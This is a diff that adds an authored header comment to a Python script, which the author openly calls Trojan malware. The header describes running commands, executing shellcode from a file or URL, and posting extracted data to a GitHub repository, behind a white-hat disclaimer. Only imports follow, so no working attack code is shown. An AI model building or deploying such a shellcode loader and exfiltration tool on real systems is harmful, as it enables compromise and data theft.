@@ -1,4 +1,27 @@
 #! /usr/bin/python
+#################################################################################################
+# Author: Nicholas Fisher
+# Date: March 5th 2024
+# Important Note:
+#  I, Nicholas Fisher, the creator of this Trojan malware, am not responsible for the misuse of 
+# these scripts. They are malicious and should only be used in professionally approved White Hat 
+# scenarios. You are responsible for any consequences resulting from the misuse of this malware,
+# including all fines, fees, and repercussions. Please read this statement carefully: by downloading 
+# any of the scripts in this repository, you, as the user, take full responsibility for storing, using,
+# and testing these malicious scripts and guidelines. You also take full responsibility for any misuse 
+# of this malware. Please note that any data the Trojan extracts will be posted to a GitHub repository, 
+# and if that repository is public, all the extracted data will be available for the whole world to see.
+# Description of Script
+# The provided Python script is a versatile tool for executing shellcode on both Windows and Linux
+# platforms. It offers users three options: executing a command directly in the shell, running 
+# shellcode stored in a local file, or fetching shellcode from a URL and executing it. Users can 
+# interactively choose their preferred option by entering 'cmd', 'file', or 'url' when prompted. 
+# For instance, if a user wants to execute a command, they would input 'cmd' and then type the 
+# desired command. An example command could be 'whoami' to retrieve the current user's username. 
+# Upon execution, the script would display the output of the command, providing valuable system 
+# information or performing actions as directed. The script empowers users to dynamically interact 
+# with their system, execute custom shellcode, and streamline security testing or automation tasks.
+#################################################################################################
 import subprocess
 import base64
 import ctypes
